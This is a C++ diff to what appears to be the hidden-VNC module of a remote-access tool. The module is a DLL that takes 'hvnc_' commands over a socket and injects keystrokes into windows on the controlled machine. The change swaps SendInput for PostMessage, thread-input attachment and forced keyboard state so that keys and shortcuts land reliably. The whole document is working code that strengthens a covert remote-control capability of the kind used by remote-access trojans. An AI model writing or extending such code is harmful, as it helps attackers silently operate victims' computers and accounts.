@@ -148,6 +148,10 @@ static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
 static atomic_int g_staticFrameCount(0);
 static atomic_bool g_forceFullFrame(false);
 
+static bool g_key_shift = false;
+static bool g_key_ctrl  = false;
+static bool g_key_alt   = false;
+static HWND g_hAttachedThreadWnd = NULL;
 // -----------------------------------------------------------------------
 
 static bool safe_send_json(SOCKET sock, const json& data) {
@@ -779,44 +783,28 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
-static bool send_key_input(WORD vk, bool down) {
-    INPUT input{};
-    input.type = INPUT_KEYBOARD;
-    input.ki.wVk = vk;
-    input.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
-    return SendInput(1, &input, sizeof(INPUT)) == 1;
-}
-
-static bool send_unicode_input(WCHAR ch) {
-    INPUT inputs[2]{};
-    inputs[0].type = INPUT_KEYBOARD;
-    inputs[0].ki.wScan = ch;
-    inputs[0].ki.dwFlags = KEYEVENTF_UNICODE;
-    inputs[1].type = INPUT_KEYBOARD;
-    inputs[1].ki.wScan = ch;
-    inputs[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
-    return SendInput(2, inputs, sizeof(INPUT)) == 2;
-}
-
-static LPARAM key_lparam(WORD vk, bool keyUp) {
-    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
-    LPARAM lp = 1 | (scan << 16);
-    if (keyUp) lp |= 0xC0000000;
-    return lp;
-}
-
-static void post_key_fallback(HWND hwnd, int vk, const string& action) {
-    if (!hwnd || !IsWindow(hwnd)) return;
-    client_log("keyboard fallback PostMessage action=" + action +
-               " vk=" + to_string(vk) +
-               " hwnd=" + to_string((uintptr_t)hwnd));
-    if (action == "hvnc_keydown") {
-        PostMessageW(hwnd, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-    } else if (action == "hvnc_keyup") {
-        PostMessageW(hwnd, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-    } else if (action == "hvnc_char") {
-        PostMessageW(hwnd, WM_CHAR, (WPARAM)vk, 1);
+static bool is_extended_key(int vk) {
+    switch (vk) {
+        case VK_INSERT: case VK_DELETE: case VK_HOME: case VK_END:
+        case VK_PRIOR: case VK_NEXT: case VK_LEFT: case VK_UP:
+        case VK_RIGHT: case VK_DOWN: case VK_DIVIDE: case VK_RMENU:
+        case VK_RCONTROL: case VK_NUMLOCK:
+            return true;
     }
+    return false;
+}
+
+static LPARAM make_lparam(UINT vk, bool up, bool ext, bool alt) {
+    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    LPARAM lp = 1; // repeat count
+    lp |= (LPARAM(scan & 0xFF) << 16);
+    if (ext) lp |= (1L << 24);
+    if (alt) lp |= (1L << 29);
+    if (up) {
+        lp |= (1L << 30);
+        lp |= (1L << 31);
+    }
+    return lp;
 }
 
 static POINT screen_pt(int normX, int normY) {
@@ -927,10 +915,58 @@ static HWND GetFocusedWindow() {
     DWORD threadId = GetWindowThreadProcessId(hTarget, NULL);
     GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
     if (GetGUIThreadInfo(threadId, &gti)) {
-        if (gti.hwndFocus) return gti.hwndFocus;
-        if (gti.hwndCaret) return gti.hwndCaret;
+        if (gti.hwndFocus && IsWindow(gti.hwndFocus)) return gti.hwndFocus;
+        if (gti.hwndCaret && IsWindow(gti.hwndCaret)) return gti.hwndCaret;
     }
     return hTarget;
+}
+
+static DWORD g_attachedThreadId = 0;
+
+static void sync_keyboard_state(HWND hTarget) {
+    if (!hTarget || !IsWindow(hTarget)) return;
+    DWORD targetThread = GetWindowThreadProcessId(hTarget, NULL);
+    DWORD myThread = GetCurrentThreadId();
+
+    if (g_attachedThreadId != targetThread) {
+        if (g_attachedThreadId != 0 && g_attachedThreadId != myThread) {
+            AttachThreadInput(myThread, g_attachedThreadId, FALSE);
+        }
+        if (targetThread != 0 && targetThread != myThread) {
+            if (AttachThreadInput(myThread, targetThread, TRUE)) {
+                g_attachedThreadId = targetThread;
+            } else {
+                g_attachedThreadId = 0;
+            }
+        } else {
+            g_attachedThreadId = 0;
+        }
+        g_hAttachedThreadWnd = hTarget;
+    }
+
+    BYTE keyState[256];
+    if (GetKeyboardState(keyState)) {
+        keyState[VK_SHIFT]    = g_key_shift ? 0x80 : 0;
+        keyState[VK_LSHIFT]   = g_key_shift ? 0x80 : 0;
+        keyState[VK_RSHIFT]   = g_key_shift ? 0x80 : 0;
+        keyState[VK_CONTROL]  = g_key_ctrl  ? 0x80 : 0;
+        keyState[VK_LCONTROL] = g_key_ctrl  ? 0x80 : 0;
+        keyState[VK_RCONTROL] = g_key_ctrl  ? 0x80 : 0;
+        keyState[VK_MENU]     = g_key_alt   ? 0x80 : 0;
+        keyState[VK_LMENU]    = g_key_alt   ? 0x80 : 0;
+        keyState[VK_RMENU]    = g_key_alt   ? 0x80 : 0;
+        SetKeyboardState(keyState);
+    }
+}
+
+static bool is_character_key(int vk) {
+    if (vk >= '0' && vk <= '9') return true;
+    if (vk >= 'A' && vk <= 'Z') return true;
+    if (vk >= VK_OEM_1 && vk <= VK_OEM_8) return true;
+    if (vk >= VK_OEM_PLUS && vk <= VK_OEM_PERIOD) return true;
+    if (vk >= VK_NUMPAD0 && vk <= VK_DIVIDE) return true;
+    if (vk == VK_SPACE) return true;
+    return false;
 }
 
 // -----------------------------------------------------------------------
@@ -957,27 +993,43 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = g_hCurrentFocus;
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
-            if (!hTarget || !IsWindow(hTarget)) continue;
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget) {
+                hTarget = GetForegroundWindow();
+                if (!hTarget) hTarget = g_hLastWindow;
+            }
+            if (!hTarget) continue;
 
-            SetForegroundWindow(GetAncestor(hTarget, GA_ROOT));
-            SetFocus(hTarget);
+            MSG dummy_msg;
+            PeekMessage(&dummy_msg, NULL, 0, 0, PM_NOREMOVE);
+            sync_keyboard_state(hTarget);
 
-            bool sendInputOk = false;
             if (action == "hvnc_keydown") {
-                sendInputOk = send_key_input((WORD)vk, true);
+                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_key_shift = true;
+                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_key_ctrl = true;
+                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_key_alt = true;
+                sync_keyboard_state(hTarget);
+
+                bool isShortcut = g_key_ctrl || g_key_alt;
+                bool isModifier = (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT ||
+                                   vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
+                                   vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU);
+
+                if (isShortcut || isModifier || !is_character_key(vk)) {
+                    UINT msg = g_key_alt ? WM_SYSKEYDOWN : WM_KEYDOWN;
+                    PostMessageW(hTarget, msg, vk, make_lparam(vk, false, is_extended_key(vk), g_key_alt));
+                }
             } else if (action == "hvnc_keyup") {
-                sendInputOk = send_key_input((WORD)vk, false);
+                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_key_shift = false;
+                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_key_ctrl = false;
+                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_key_alt = false;
+
+                UINT msg = (g_key_alt || (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU)) ? WM_SYSKEYUP : WM_KEYUP;
+                PostMessageW(hTarget, msg, vk, make_lparam(vk, true, is_extended_key(vk), g_key_alt));
+                sync_keyboard_state(hTarget);
             } else if (action == "hvnc_char") {
-                sendInputOk = send_unicode_input((WCHAR)vk);
+                PostMessageW(hTarget, WM_CHAR, vk, 1);
             }
-            if (!sendInputOk) {
-                client_log("SendInput failed action=" + action +
-                           " vk=" + to_string(vk) +
-                           " error=" + to_string(GetLastError()));
-            }
-            post_key_fallback(hTarget, vk, action);
             g_forceFullFrame = true;
             continue;
         }
@@ -1162,6 +1214,12 @@ static void input_loop() {
             continue;
         }
     }
+
+    if (g_attachedThreadId != 0) {
+        AttachThreadInput(GetCurrentThreadId(), g_attachedThreadId, FALSE);
+    }
+    g_attachedThreadId = 0;
+    g_hAttachedThreadWnd = NULL;
 }
 
 static wstring utf8_to_wstring(const string& str) {
@@ -1229,6 +1287,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_mouseDownTarget[2] = NULL;
             g_staticFrameCount = 0;
             g_forceFullFrame = false;
+            g_key_shift = false;
+            g_key_ctrl = false;
+            g_key_alt = false;
+            g_hAttachedThreadWnd = NULL;
         } else if (action == "hvnc_quality") {
             lock_guard<mutex> lock(g_captureMutex);
             g_scalePercent = cmd.value("quality", 50);
